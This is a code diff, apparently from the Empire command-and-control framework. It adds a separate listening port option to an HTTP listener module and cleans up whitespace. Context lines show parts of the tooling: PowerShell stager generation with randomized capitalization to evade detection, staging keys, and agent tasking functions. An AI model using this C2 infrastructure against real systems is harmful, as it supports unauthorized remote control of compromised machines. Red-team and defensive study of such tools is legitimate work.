@@ -54,9 +54,14 @@ class Listener:
                 'Value'         :   '0.0.0.0'
             },
             'Port' : {
-                'Description'   :   'Port for the listener.',
+                'Description'   :   'Port for agents to connect on.',
                 'Required'      :   True,
                 'Value'         :   80
+            },
+            'ListenPort' : {
+                'Description'   :   'Optional different port for listening on the control server',
+                'Required'      :   False,
+                'Value'         :   ""
             },
             'Launcher' : {
                 'Description'   :   'Launcher string.',
@@ -201,7 +206,7 @@ class Listener:
                         if "https" in host:
                             host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
                         else:
-                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port) 
+                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)
 
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
@@ -256,7 +261,7 @@ class Listener:
         stagingKey = listenerOptions['StagingKey']['Value']
         host = listenerOptions['Host']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
-        
+
         # select some random URIs for staging from the main profile
         stage1 = random.choice(uris)
         stage2 = random.choice(uris)
@@ -367,7 +372,7 @@ class Listener:
 
         if language:
             if language.lower() == 'powershell':
-                
+
                 updateServers = """
                     $Script:ControlServers = @("%s");
                     $Script:ServerIndex = 0;
@@ -382,7 +387,7 @@ class Listener:
                     }
 
                 """ % (listenerOptions['Host']['Value'])
-                
+
                 getTask = """
                     function script:Get-Task {
                         try {
@@ -610,13 +615,17 @@ class Listener:
         try:
             certPath = listenerOptions['CertPath']['Value']
             host = listenerOptions['Host']['Value']
+            if listenerOptions['ListenPort']['Value'] == '':
+                listenport = port
+            else:
+                listenport = listenerOptions['ListenPort']['Value']
             if certPath.strip() != '' and host.startswith('https'):
                 certPath = os.path.abspath(certPath)
                 context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
                 context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
-                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
+                app.run(host=bindIP, port=int(listenport), threaded=True, ssl_context=context)
             else:
-                app.run(host=bindIP, port=int(port), threaded=True)
+                app.run(host=bindIP, port=int(listenport), threaded=True)
 
         except Exception as e:
             print helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
